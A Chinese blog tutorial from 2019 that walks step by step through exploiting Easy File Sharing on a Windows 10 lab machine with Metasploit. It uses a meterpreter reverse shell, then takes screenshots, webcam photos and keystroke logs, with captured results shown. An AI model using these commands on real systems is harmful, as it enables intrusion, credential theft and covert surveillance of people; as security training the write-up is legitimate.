---
title: 利用msf攻击win10
date: 2019-03-30
---
-----------------------------------
攻击环境：
攻击者系统：虚拟机下kali linux
靶机系统：win10（需要打开Easy File Sharing服务）
攻击者ip：10.3.134.27
靶机ip：10.3.37.56
攻击者和靶机在同一个wifi下，保证在同一网段里，能互相ping通。
漏洞利用：EsayFileSharing
###### **注意点：** 攻击者的虚拟机网络模式应选择桥接模式。

--------------------

**准备工作完成，可以开始内网渗透之旅了。**

## step-1
首先我们先用nmap扫描一下靶机开了哪些服务
`root@kali:~# nmap -sV 10.3.37.56`
![namp扫描结果](https://s2.ax1x.com/2019/03/30/AByzVK.png)我们可以看到80端口和443端口开放了，对应的是Easy File Sharing Web Server，满足EasyFileSharing漏洞攻击，进入下一步。

## step-2
打开msf控制台，设置攻击参数

```
root@kali:~# msfconsole              #进入控制台，稍微等一下
msf > search EasyFileSharing         #查找我们要用的漏洞
```
![搜索结果](https://s2.ax1x.com/2019/03/30/AB63Mn.png)
我们选择最新的一个，2017-06-12的版本，并设置payload。

```
msf > use exploit/windows/http/easyfilesharing_post    #使用这个漏洞
msf exploit(windows/http/easyfilesharing_post) > set payload windows/meterpreter/reverse_tcp   #设置攻击payload
```
我们用show options看一下需要什么攻击参数

```
msf exploit(windows/http/easyfilesharing_post) > show options
```
![设置参数](https://s2.ax1x.com/2019/03/30/AB6bo8.png)
根据Required属性看一下哪些是需要配置的，其中一些是配置好的，我们只需将其他的配置好就ok了。
```
msf exploit(windows/http/easyfilesharing_post) > set lhost 10.3.134.27   #设置本地ip
msf exploit(windows/http/easyfilesharing_post) > set rhost 10.3.37.56    #设置远程ip
```
参数都配置好了，接着就是激动人心的exploit了。

```
msf exploit(windows/http/easyfilesharing_post) > exploit   #攻击
```
![显示这个页面，说明你成功了](https://s2.ax1x.com/2019/03/30/ABcCwV.png)
逐个输入以下命令，试试

```
meterpreter > getuid          #获取靶机uid
meterpreter > shell           #进入靶机shell
meterpreter > screenshot      #靶机截屏
meterpreter > webcam_snap     #用靶机摄像头拍照
meterpreter > webcam_stream   #用靶机摄像头录像
meterpreter > keyscan_start   #开启键盘记录
meterpreter > keyscan_dump    #捕获键盘记录
meterpreter > keyscan_stop    #停止键盘记录
```
我们来测试几个好玩的
***1st.捕捉靶机键盘记录*** 
![捕捉到靶机键盘记录（hack hack）](https://s2.ax1x.com/2019/03/30/ABcO76.png)
***2nd.捕捉靶机截屏***
![捕捉靶机截屏](https://s2.ax1x.com/2019/03/30/ABgkHP.png)
![捕捉靶机截屏](https://s2.ax1x.com/2019/03/30/ABg9cd.md.jpg)
***3rd.用靶机摄像头拍照***
![利用靶机摄像头拍照](https://s2.ax1x.com/2019/03/30/ABg8EV.png)
![靶机摄像头像素略渣，不过看看我们的公教区学习环境吧](https://s2.ax1x.com/2019/03/30/ABgn3Q.jpg)

## 小结：
**我们做攻击实验都是在环境都配置好的情况下，现实生活中不会有这么好的肉鸡。而且网络攻击属于违法行为，人生路漫漫，且行且珍惜hhhhh**
